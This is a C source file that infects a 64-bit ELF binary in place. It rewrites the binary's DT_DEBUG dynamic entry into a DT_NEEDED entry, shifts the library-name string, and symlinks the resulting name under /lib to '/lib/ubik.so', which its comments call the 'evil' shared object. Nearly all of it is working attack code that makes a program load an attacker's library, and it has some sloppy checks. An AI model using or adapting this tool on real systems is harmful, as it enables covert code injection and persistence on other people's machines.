#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <elf.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <stdint.h>
#include <sys/stat.h>
#include <fcntl.h>

#define ELF32 1	
#define ELF64 2

// Get to the DT_DYNAMIC and find address
	// Program Header
	// PT_DYNAMIC segment

int determine_arch(uint8_t* mem){
    // First check if an ELF file
    if(mem[0] != 0x7f && strcmp(&mem[1], "ELF")){
        fprintf(stderr, "Not an elf, perhaps a dwarf");
        exit(-1);
    }
    // Magic bytes for 32 bit are 7f 45 4c 46 01
    if(mem[4] == 0x01){
        return ELF32;
    }
    // Magic bytes for 64 bit are 7f 45 4c 46 02
    else if(mem[4] == 0x02){
        return ELF64;
    }
}

int main(int argc, char **argv){
    int fd; // The file descriptor for the bin to analyze
    int dyn_array_index = -1;
    int amount_dynamic_entries = 0;  
	int first_dt_needed = 0;
    uint8_t* mem; // Where the file will be mapped to memory
    struct stat f_stat; // stat struct that will let us map the file using st_size
    Elf64_Dyn *dt_debug_entry = NULL;
	Elf64_Dyn *dt_needed_entry = NULL;    

    if((fd = open(argv[1], O_RDWR)) < 0){ 
        perror("open");
        exit(-1);
    }   
    if(fstat(fd, &f_stat) < 0){ 
        perror("fstat");
        exit(-1);
    }   
    mem = mmap(NULL, f_stat.st_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0); // Map binary to memory
    if(mem == MAP_FAILED) {
        perror("mmap");
        exit(-1);
    }   
    if(determine_arch(mem) == ELF32){ 
		perror("wrong arch");
		exit(-1);
	 }
    else if(determine_arch(mem) == ELF64){ 
        //parse64(mem); 
    }
	//Get the ELF Header Table
	Elf64_Ehdr* elf_header = (Elf64_Ehdr *)mem;
	//Get Section Header Table
	Elf64_Shdr* section_header_table = (Elf64_Shdr *)&mem[elf_header->e_shoff];
	//Get string table
	char* string_table = &mem[section_header_table[elf_header->e_shstrndx].sh_offset];
	//Get the Program Header Table
	Elf64_Phdr* program_header_table = (Elf64_Phdr *)&mem[elf_header->e_phoff];
	//Get the PT_DYNAMIC segment
	for(int i = 0; i < elf_header->e_phnum; i++){
		if(program_header_table[i].p_type == PT_DYNAMIC){
			printf("PT_DYNAMIC: 0x%x\n", program_header_table[i].p_vaddr);
			dyn_array_index = i;
		}
	}	
	
	//Get amount of dynamic struct entries
	for(int i = 1; i < elf_header->e_shnum; i++){
		if(section_header_table[i].sh_type == SHT_DYNAMIC){
			amount_dynamic_entries = section_header_table[i].sh_size / sizeof(Elf64_Dyn);
		}
	}
	
	//Parse Elf64_Dyn
	Elf64_Dyn* dynamic_array = (Elf64_Dyn *)&mem[program_header_table[dyn_array_index].p_offset];
    for (int i = 0; i < amount_dynamic_entries; i++) {
		if (dynamic_array[i].d_tag == DT_NEEDED){
			printf("DT_NEEDED found at address: 0x%lx\n", dynamic_array[i].d_un.d_ptr);
			if (dt_needed_entry == NULL){
				dt_needed_entry = &dynamic_array[i];
			}
		}
        else if (dynamic_array[i].d_tag == DT_DEBUG) {
        	printf("DT_DEBUG found at address: 0x%lx\n", dynamic_array[i].d_un.d_ptr);
        	dt_debug_entry = &dynamic_array[i];
			break; // You can break the loop once you find DT_DEBUG
		}
	}
	//Changing DT_DEBUG to DT_NEEDED	
	if (dt_debug_entry == NULL){
		perror("no dt_debug\n");
		exit(-1);
	}
	dt_debug_entry->d_tag = DT_NEEDED;
		

	//Change Order symbols get resolved in.
	Elf64_Xword dt_needed_val = dt_needed_entry->d_un.d_val;
	unsigned long old_debug_addy = dt_debug_entry->d_un.d_ptr;
	dt_debug_entry->d_un.d_ptr = dt_needed_entry->d_un.d_ptr;
	dt_needed_entry->d_un.d_ptr = old_debug_addy;


	//Change value of new dt_needed entry
	dt_needed_entry->d_un.d_val = dt_needed_val + 2; // dt_needed acts as the new dt_debug, since the d_ptr's were switched
	
	//Read dynamic string table
	int dynamic_table_index;
	for (int i = 1; i < elf_header->e_shnum; i++){
		if(section_header_table[i].sh_type == SHT_DYNAMIC){
			dynamic_table_index = i;
		}
	}
	//Get name of evil shared object file 
	Elf64_Word dynstr_table_index = section_header_table[dynamic_table_index].sh_link;
	Elf64_Shdr* dynamic_string_table = &section_header_table[dynstr_table_index];
	char *dynstr = (char *)(mem + dynamic_string_table->sh_offset);
    char *fake_so = (char *) &dynstr[dt_needed_entry->d_un.d_val]; 
	printf("Evil so: %s\n", fake_so); 	

	//Create symbolic link to ubik.so
	char fake_so_path[255] = "/lib/";
	strcat(fake_so_path, fake_so);
	printf("%s\n", fake_so_path);
	
	if (symlink("/lib/ubik.so", fake_so_path) == 0){
		printf("symbolic link made");
	}
	
	else {
		perror("error making symbolic link");
		return 1;
	}
	

	if (msync(mem, f_stat.st_size, MS_SYNC) < 0){
		perror("msync");
		exit(-1);
	}
			
  	close(fd);
    return 1;
}
